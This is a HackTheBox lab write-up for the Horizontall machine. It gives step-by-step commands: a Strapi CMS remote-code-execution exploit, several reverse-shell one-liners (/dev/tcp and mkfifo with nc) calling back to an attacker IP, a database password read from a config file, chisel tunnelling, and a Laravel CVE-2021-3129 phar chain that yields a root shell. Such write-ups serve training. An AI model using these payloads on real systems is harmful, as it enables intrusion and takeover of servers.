---
title: HTB | Horizontall
description: Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the Strapi Headless CMS which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the strapi user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as root.
slug: horizontall-htb
date: 2025-03-06 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Horizontall cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Horizontall</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.105</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Horizontall]
└─$ nmap -sC -sV -An -T4 -vvv 10.10.11.105
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold : Strapi CMS

### Subdomain enumeration : api-prod.horizontall.htb

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt  -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 30ms]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 57ms]
:: Progress: [114441/114441] :: Job [1/1] :: 2020 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

http://api-prod.horizontall.htb/admin/strapiVersion
-->
3.0.0-beta.17.4

### CVE : Strapi 3.0.0-beta.17.4

```bash
┌──(kali㉿kali)-[~/htb/Horizontall]
└─$ searchsploit strapi 3.0.0-beta.17.4      
-------------------------------------------
 Exploit Title              |  Path
-------------------------------------------
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)  | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)    | nodejs/webapps/50716.rb
-------------------------------------------
Shellcodes: No Results
```

### Strapi RCE

```bash
┌──(kali㉿kali)-[~/htb/Horizontall]
└─$ python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzQxMjcyNTQ0LCJleHAiOjE3NDM4NjQ1NDR9.VKjJDQK6JqpNUo7Zsg5plpM2HHmdxLyTboI9kDnixHk

$> bash -i >& /dev/tcp/10.10.14.19/1337 0>&1
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.19%2F1337%200%3E%261
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.19 1337 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output

----------------------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337                 
listening on [any] 1337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.105] 43406
bash: cannot set terminal process group (1988): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ whoami 
whoami
strapi
```

### database.json - user/password for mysql
```bash
strapi@horizontall:~/myapi$ grep -rni pass config/
config/environments/production/database.json:13:        "password": "${process.env.DATABASE_PASSWORD || ''}",
config/environments/development/database.json:12:        "password": "#J!:F9Zt2u"
config/environments/staging/database.json:13:        "password": "${process.env.DATABASE_PASSWORD || ''}",
strapi@horizontall:~/myapi$ config/
bash: config/: Is a directory
strapi@horizontall:~/myapi$ cd config/
strapi@horizontall:~/myapi/config$ cd environments/development/
strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

### mysql - nothing interesting
```bash
ptrapi@horizontall:~/myapi/config/environments/development$ mysql -u developer - 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 29
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use strapi;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
8 rows in set (0.00 sec)

mysql> select * from strapi_administrator;
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$bPZbunuhF9lWrddSuw3RI.QmCitfZDJmwbB0WozXlxT2siCwanVVK | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
1 row in set (0.00 sec)

                                                                    ^^^
                                                                    |||
                                                                    |||
                                                                    |||

                                                 THIS IS OUR PASSWORD THAT WE HAVE DEFINED...

```

## Privilege Escalation

### Laravel port 8000
On découvre qu'un service tourne sur le port 8000, il s'agit du framework laravel. Dans un premier temps, il a fallu faire du port forwarding afin d'avoir plus d'informations.

### Chisel
On fait du port forwarding avec chisel pour dupliquer sur ma kali le port 8000 de la machine cible. On découvre ensuite qu'il s'agit du framework laravel qui se cache derriere.
```bash
┌──(kali㉿kali)-[~/htb/Horizontall]
└─$ ./chisel server -p 1082 --reverse
2025/03/06 10:36:18 server: Reverse tunnelling enabled
2025/03/06 10:36:18 server: Fingerprint GadUpp2bJ5QyhTVJpJx1RJ3JnbEW0HpdrGb1bHRNevo=
2025/03/06 10:36:18 server: Listening on http://0.0.0.0:1082
2025/03/06 10:36:20 server: session#1: tun: proxy#R:8000=>localhost:8000: Listening

-----------------------
## Sur la machine cible

$ ./chisel client 10.10.14.19:1082 R:8000:localhost:8000 > /dev/null 2> /dev/null &

```

### Laravel : CVE-2021-3129
https://nvd.nist.gov/vuln/detail/cve-2021-3129
On doit générer un fichier phar qui permettra d'executer une commande en particulier.
Ensuite, on peut exploiter laravel en passant au fichier python le fichier phar.
```bash
┌──(kali㉿kali)-[~/htb/Horizontall/laravel-exploits/phpggc]
└─$ python3 ./laravel-ignition-rce.py 
Usage: ./laravel-ignition-rce.py <url> </path/to/exploit.phar> [log_file_path]

Generate your PHAR using PHPGGC, and add the --fast-destruct flag if you want to see your command's result. The Monolog/RCE1 GC works fine.

Example:
  $ php -d'phar.readonly=0' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id
  $ ./laravel-ignition-rce.py http://127.0.0.1:8000/ /tmp/exploit.phar
```

### Exploit - gaining root shell
```bash
┌──(kali㉿kali)-[~/htb/Horizontall/laravel-exploits/]
└─$  git clone https://github.com/ambionics/phpggc.git; cd phpggc
...

## On génère le fichier phar qui executera la commande "id"
┌──(kali㉿kali)-[~/htb/Horizontall/laravel-exploits/phpggc]
└─$ php -d'phar.readonly=0' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.19 6666 >/tmp/f"


┌──(kali㉿kali)-[~/htb/Horizontall/laravel-exploits/phpggc]
└─$ cd ..                      
            
┌──(kali㉿kali)-[~/htb/Horizontall/laravel-exploits]
└─$ python3 ./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar               
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !

--------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6666                    
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.105] 54562
bash: cannot set terminal process group (25151): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# whoami
whoami
root
root@horizontall:/home/developer/myproject/public# cat /root/root.txt
cat /root/root.txt
a901e.....5a11
```